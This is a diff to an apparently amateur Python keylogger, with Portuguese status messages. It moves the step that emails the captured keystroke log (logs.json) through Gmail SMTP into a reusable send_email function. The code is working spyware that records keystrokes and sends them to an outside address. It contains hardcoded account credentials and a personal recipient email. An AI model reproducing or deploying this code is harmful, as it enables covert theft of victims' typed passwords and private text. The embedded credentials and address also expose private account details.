@@ -34,6 +34,23 @@ def on_release(key):
     update_json_file(key_list)
 
 
+def send_email(email, password, receiver, subject = '(no subject)'):
+    msg = EmailMessage()
+    msg['Subject'] = subject
+    msg['To'] = receiver
+
+    with open(json_file_path) as myfile:
+        data = myfile.read()
+        msg.set_content(data)
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.login(email, password)
+        server.send_message(msg)
+
+    print("Email sent!")
+
+
 print(
     "[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'"
 )
@@ -43,18 +60,5 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
     print("[-] Keylogger finalizado!")
 
-msg = EmailMessage()
-msg['Subject'] = 'keylogger'
-msg['From'] = 'MC Poze'
-msg['To'] = 'd.lima@aln.senaicimatec.edu.br'
-
-with open(json_file_path) as myfile:
-    data = myfile.read()
-    msg.set_content(data)
-
-with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.login("mcpozebaiano", "mcpozedorodo")
-    server.send_message(msg)
-
-print("Email sent!")
+send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
+           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
